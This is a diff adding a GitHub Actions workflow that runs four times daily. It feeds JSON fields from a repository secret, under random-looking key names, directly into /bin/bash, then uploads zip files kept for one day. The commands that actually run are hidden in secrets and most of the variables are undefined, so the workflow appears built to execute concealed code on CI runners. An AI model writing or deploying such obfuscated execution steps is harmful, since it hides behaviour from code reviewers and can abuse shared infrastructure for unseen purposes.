@@ -1,0 +1,36 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '23 2,8,14,20 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  process:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Start
+        env:
+          ra1: ${{ secrets.ra1 }}
+        run: |
+          printf '%s' "$ra1" | jq -r .yodgl61830 | /bin/bash
+          echo $osvt0 | jq -r .vn034 | /bin/bash
+          printf '%s' "$aovl81" | jq -r .b04 | /bin/bash
+          echo $blq556 | jq -r .e87 | /bin/bash
+          printf '%s' "$dpqi9" | jq -r .fswna99 | /bin/bash
+          printf '%s' "$zs230" | jq -r .g49989 | /bin/bash
+          printf '%s' "$rsdit8" | jq -r .xkmy7 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: FCutnrri
+          path: "*.zip"
+          retention-days: 1
